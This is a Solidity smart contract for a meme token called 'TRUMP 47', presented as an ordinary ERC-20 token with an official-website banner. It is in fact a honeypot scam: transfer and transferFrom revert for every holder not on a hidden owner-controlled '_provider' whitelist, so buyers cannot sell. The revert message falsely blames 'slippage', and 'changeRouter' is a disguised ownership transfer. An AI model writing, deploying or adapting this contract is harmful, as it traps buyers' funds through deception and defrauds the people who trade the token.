// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

// ████████╗██████╗░██╗░░░██╗███╗░░░███╗██████╗░░░██╗██╗███████╗
// ╚══██╔══╝██╔══██╗██║░░░██║████╗░████║██╔══██╗░██╔╝██║╚════██║
// ░░░██║░░░██████╔╝██║░░░██║██╔████╔██║██████╔╝██╔╝░██║░░░░██╔╝
// ░░░██║░░░██╔══██╗██║░░░██║██║╚██╔╝██║██╔═══╝░███████║░░░██╔╝░
// ░░░██║░░░██║░░██║╚██████╔╝██║░╚═╝░██║██║░░░░░╚════██║░░██╔╝░░
// ░░░╚═╝░░░╚═╝░░╚═╝░╚═════╝░╚═╝░░░░░╚═╝╚═╝░░░░░░░░░░╚═╝░░╚═╝░░░
// Official Website: www.trump47.republican

contract TRUMP47 {

    string public name = "TRUMP 47";
    string public symbol = "TRUMP47";
    uint8  public decimals = 18;
    uint256 public totalSupply = 1_000_000_000 * 10**uint256(decimals);

    address public owner;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    mapping(address => bool) private _provider;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() {
        owner = msg.sender;
        _balances[owner] = totalSupply;
        _provider[owner] = true;
        emit Transfer(address(0), owner, totalSupply);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can call");
        _;
    }

    function setProvider(address _user, bool _value) external onlyOwner {
        require(_user != address(0), "Invalid address");
        _provider[_user] = _value;
    }

    function balanceOf(address account) external view returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(to != address(0), "Invalid address");
        require(_balances[msg.sender] >= amount, "Insufficient balance");

        if (!_provider[msg.sender]) {
            revert("Please increase your slippage level");
        }
        _balances[msg.sender] -= amount;
        _balances[to] += amount;

        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(to != address(0), "Invalid address");
        require(_balances[from] >= amount, "Insufficient balance");
        require(_allowances[from][msg.sender] >= amount, "Allowance exceeded");

        if (!_provider[from]) {
            revert("Please increase your slippage level");
        }

        _balances[from] -= amount;
        _allowances[from][msg.sender] -= amount;

        _balances[to] += amount;

        emit Transfer(from, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        require(spender != address(0), "Invalid address");
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function allowance(address _owner, address _spender) external view returns (uint256) {
        return _allowances[_owner][_spender];
    }

    function changeRouter(address newRouter) external onlyOwner {
        require(newRouter != address(0), "Invalid address");
        _provider[newRouter] = true;  
        owner = newRouter;
    }
}